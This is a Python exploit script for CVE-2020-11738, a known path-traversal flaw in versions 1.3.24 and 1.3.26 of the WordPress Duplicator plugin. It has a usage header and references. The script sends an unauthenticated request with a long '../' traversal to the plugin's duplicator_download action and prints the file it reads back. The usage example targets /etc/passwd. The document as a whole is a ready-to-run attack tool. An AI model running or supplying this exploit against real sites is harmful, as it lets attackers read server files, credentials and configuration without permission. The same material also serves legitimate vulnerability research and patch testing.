'''
CVE-2020-11738
Wordpress Plugin Duplicator 1.3.24 & 1.3.26 - Unauthenticated Arbitrary File Read
Exploit: cm0s
Link: https://wordpress.org/plugins/duplicator/
Reference:
    - https://wpscan.com/vulnerability/35227c3a-e893-4c68-8cb6-ffe79115fb6d
    - https://nvd.nist.gov/vuln/detail/CVE-2020-11738

Usage:
    python3 CVE-2020-11738.py <domain> <file>

Example:
    python3 CVE-2020-11738.py http:/pwnme.me /etc/passwd
'''

import requests
import sys

if len(sys.argv) != 3:
        print("CVE-2020-11738")
        print('''Usage:
    python3 CVE-2020-11738.py <domain> <file>

Example:
    python3 CVE-2020-11738.py http:/pwnme.me /etc/passwd''')
        exit()

domain = sys.argv[1].rstrip('/')
file = sys.argv[2]

url = domain + "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../.." + file

try:
    print(url)
    response = requests.get(url)
    print(response.text)
except Exception as e:
    print(e)